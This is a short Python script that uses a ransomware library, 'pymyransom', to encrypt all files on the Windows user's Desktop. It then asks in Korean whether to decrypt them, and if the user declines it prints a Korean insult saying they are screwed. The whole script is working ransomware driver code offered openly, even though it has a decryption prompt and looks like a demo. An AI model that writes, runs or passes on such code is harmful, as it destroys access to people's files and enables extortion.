#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Nov 24 21:33:39 2020

@author: kw
"""


import pymyransom
ransom1 = pymyransom.makeMyRansomware(".Example")
ransom1.Encryptor("c:/Users/"+ransom1.username+"/Desktop/**")
answer = input("해독하시겠습니까? (y/n)")
if answer == 'y':
    ransom1.Decryptor("c:/Users/"+ransom1.username+"/Desktop/**")
else:
    input("당신은 좆되셨습니다.")
